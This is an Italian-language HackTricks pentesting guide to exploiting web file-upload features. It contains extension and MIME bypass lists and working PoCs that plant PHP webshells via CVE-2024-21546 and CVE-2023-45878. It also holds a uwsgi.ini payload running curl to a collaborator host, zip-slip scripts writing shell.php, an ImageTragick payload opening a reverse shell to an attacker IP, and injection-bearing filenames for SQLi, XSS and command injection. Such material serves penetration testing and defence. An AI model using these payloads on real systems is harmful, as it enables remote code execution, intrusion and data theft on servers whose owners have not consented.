# Caricamento file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per il caricamento file

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, controlla le estensioni precedenti. Testale anche usando lettere maiuscole: _pHp, .pHP5, .PhAr ..._
2. Controlla aggiungendo una estensione valida prima dell'estensione di esecuzione (usa anche le estensioni precedenti):
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere caratteri speciali alla fine. Puoi usare Burp per bruteforceare tutti i caratteri ascii e Unicode. (Nota che puoi anche provare a usare le estensioni precedentemente menzionate)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni ingannando il parser delle estensioni lato server con tecniche come il raddoppio dell'estensione o aggiungendo dati junk (null bytes) tra le estensioni. Puoi anche usare le estensioni precedenti per preparare un payload più efficace.
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi un altro livello di estensioni al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'estensione di esecuzione prima dell'estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi cosa con estensione **.php**, anche se non termina necessariamente con .php, può eseguire codice):
- _ex: file.php.png_
7. Usare NTFS alternate data stream (ADS) su Windows. In questo caso, un carattere due punti ":" verrà inserito dopo un'estensione vietata e prima di una consentita. Di conseguenza, verrà creato sul server un file vuoto con l'estensione vietata (es. "file.asax:.jpg”). Questo file potrebbe essere modificato in seguito usando altre tecniche come il short filename. Il pattern "**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un carattere punto dopo questo pattern potrebbe essere utile per aggirare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a superare i limiti del nome file. L'estensione valida viene troncata. E rimane il PHP maligno. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handler rimuovono o normalizzano i caratteri punto finali dal filename salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, puoi bypassare la validazione delle estensioni:

- Usando un MIME immagine valido e l'header magic corretto (es., il PNG `\x89PNG\r\n\x1a\n`).
- Nominando il file caricato con un'estensione PHP seguita da un punto, es., `shell.php.`.
- Il server rimuove il punto finale e persiste `shell.php`, che verrà eseguito se collocato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

PoC minimale (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Poi richiedi il percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Aggiorna unisharp/laravel-filemanager a ≥ 2.9.1.
- Applica allowlists rigorose lato server e riesegui la validazione del nome file persistito.
- Servi gli upload da percorsi non eseguibili.

### Bypass di Content-Type, Magic Number, Compression & Resizing

- Bypass dei controlli di **Content-Type** impostando il **valore** dell'**header** **Content-Type** su: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass del controllo del **magic number** aggiungendo all'inizio del file i **byte di una vera immagine** (per confondere il comando _file_). Oppure inserisci la shell nei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se alla tua immagine viene applicata la **compressione**, per esempio usando librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche **ridimensionare** l'**image**, usando per esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Altri trucchi da provare

- Trova una vulnerabilità per **rinominare** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibile divulgazione di informazioni**:
1. Carica **più volte** (e **contemporaneamente**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **"." , "..", or "…" come nome**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/", il filename "." creerà un file chiamato "uploads" nella directory "/www/".
4. Carica un file che potrebbe non essere facilmente cancellato come **"…:.jpg"** in **NTFS**. (Windows)
5. Carica un file in **Windows** con caratteri **invalidi** come `|<>*?”` nel suo nome. (Windows)
6. Carica un file in **Windows** usando nomi **riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** quando viene aperto accidentalmente dalla vittima.

### Trucchi per estensioni speciali

Se stai cercando di caricare file su un **PHP server**, [dai un'occhiata al trucco **.htaccess** per eseguire codice](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **ASP server**, [dai un'occhiata al trucco **.config** per eseguire codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguirli con php, o includerli in uno script...).

L'estensione `.inc` è talvolta usata per file php che vengono usati solo per **includere/importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso che **questa estensione venga eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML su un server Jetty puoi ottenere [RCE perché **nuovi *.xml e *.war vengono processati automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come mostrato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate su server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI utilizzano una sintassi specifica per incorporare variabili "magiche", placeholder e operatori. In particolare, l'operatore '@', usato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari schemi supportati in uWSGI, lo schema "exec" è particolarmente potente, permettendo di leggere i dati dall'output standard di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando un file di configurazione `.ini` viene processato.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e parsata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco Denial of Service) oppure il file deve essere impostato in auto-reload. La funzionalità di auto-reload, se abilitata, ricarica il file a intervalli specificati quando rileva modifiche.

È cruciale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (come un'immagine o un PDF), estendendo ulteriormente l'ambito di potenziale sfruttamento.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint non autenticato in Gibbon LMS consente arbitrary file write all'interno della web root, portando a pre-auth RCE tramite il caricamento di un file PHP. Versioni vulnerabili: fino e inclusa la 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Metodo: POST
- Parametri richiesti:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name, decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC minimo per scrivere e leggere un file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Carica un webshell minimale ed esegui comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver splittato per `;` e `,`, poi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare estensione/tipo.
- Il codice risultante viene eseguito come l'utente del servizio web (ad es., XAMPP Apache on Windows).

Le referenze per questo bug includono l'advisory di usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti scoprire che un server sta usando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia inclusa in una whitelist per assicurare che vengano scaricati solo file consentiti. Tuttavia, **questa verifica può essere bypassata.**\
La **lunghezza massima** di un **nome del file** in **linux** è **255**, tuttavia, **wget** tronca i nomi dei file a **236** caratteri. Puoi **scaricare un file chiamato "A"*232+".php"+".gif"**, questo nome file **bypasserà** il **controllo** (come in questo esempio **".gif"** è un'estensione **valida**) ma `wget` **rinominerà** il file in "A"*232+".php".
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **another option** a cui potresti pensare per bypassare questo controllo è far sì che il **HTTP server** reindirizzi a un file diverso, così l'URL iniziale bypasserà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parameter** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel testing dei meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle web application.

### Corrupting upload indices with snprintf quirks (historical)

Alcuni legacy upload handler che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di inconsistenze e troncamenti nel comportamento di `snprintf()`, un singolo upload attentamente costruito può apparire come più file indicizzati sul lato server, confondendo la logica che assume una forma rigorosa (es. trattandolo come un upload multi-file e prendendo branch non sicuri). Pur essendo raro oggi, questo pattern di “index corruption” occasionalmente riemerge in CTFs e codebase più vecchie.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti essere in grado di ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una XSS
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (più [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **different svg payloads** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi **indicare the web server to catch an image from a URL** potresti provare ad abusare di una [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **saved** in qualche sito **public**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: La [pagina seguente mostra come **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che eseguirà JS arbitrario seguendo le indicazioni fornite.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content per verificare se il server ha qualche **antivirus**
- Controlla se esiste qualche **size limit** nell'upload dei file

Ecco una top 10 delle cose che puoi ottenere caricando file (da [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Fai riferimento a [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Zip/Tar File Automatically decompressed Upload

Se puoi uploadare uno ZIP che verrà decompressed all'interno del server, puoi fare 2 cose:

### Symlink

Uploada un link contenente soft links ad altri file, poi, accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inaspettata di file in directory durante la decompressione è un problema significativo. Nonostante l'assunto iniziale che questa configurazione potesse proteggere contro l'OS-level command execution tramite upload di file malevoli, il supporto alla compressione gerarchica e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attaccanti di bypassare le restrizioni e uscire dalle secure upload directories manipolando la funzionalità di decompressione dell'applicazione target.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utility può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **symlink trick with evilarc** è un'opzione. Se l'obiettivo è puntare a un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file nel tuo sistema. Questo garantisce che evilarc non incontri errori durante la sua esecuzione.

Di seguito è riportato un esempio di codice Python utilizzato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Viene scritto codice PHP per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un hex editor, sostituendo "xxA" con "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dall'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP shell in PNG

Incorporare una PHP shell nel chunk IDAT di un file PNG può bypassare efficacemente alcune operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, essendo comunemente usate rispettivamente per il ridimensionamento e il rialcampionamento delle immagini. La capacità della PHP shell incorporata di rimanere non alterata da queste operazioni è un vantaggio significativo per alcuni casi d'uso.

Un'esplorazione dettagliata di questa tecnica, inclusa la metodologia e le possibili applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

Ulteriori informazioni in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File poliglotta

I file poliglotta sono uno strumento unico nella sicurezza informatica, agendo come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Questi file non sono limitati a questa combinazione; sono possibili anche accoppiamenti come GIF e JS o PPT e JS.

L'utilità principale dei file poliglotta risiede nella loro capacità di eludere misure di sicurezza che filtrano i file in base al tipo. La pratica comune in molte applicazioni prevede di permettere solo determinati tipi di file per l'upload—come JPEG, GIF o DOC—per mitigare il rischio rappresentato da formati potenzialmente pericolosi (ad es., JS, PHP o file Phar). Tuttavia, un poliglotta, conformandosi ai criteri strutturali di più tipi di file, può aggirare furtivamente queste restrizioni.

Nonostante la loro adattabilità, i poliglotta incontrano delle limitazioni. Per esempio, mentre un poliglotta potrebbe incarnare contemporaneamente un file PHAR (PHp ARchive) e un JPEG, il successo del suo upload potrebbe dipendere dalle politiche sulle estensioni dei file della piattaforma. Se il sistema è rigido riguardo alle estensioni consentite, la mera dualità strutturale di un poliglotta potrebbe non essere sufficiente a garantire l'upload.

### Caricare JSON validi come se fossero PDF

Come evitare il rilevamento del tipo di file caricando un JSON valido anche se non consentito, fingendo che sia un PDF (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungi un finto formato PDF all'interno di un campo del JSON in modo che la libreria lo interpreti come un PDF (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Basta creare un JSON più grande di quella soglia in modo che non possa parsare il contenuto come JSON e poi inserire all'interno del JSON la parte iniziale di un PDF reale e lo considererà un PDF

## Riferimenti

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
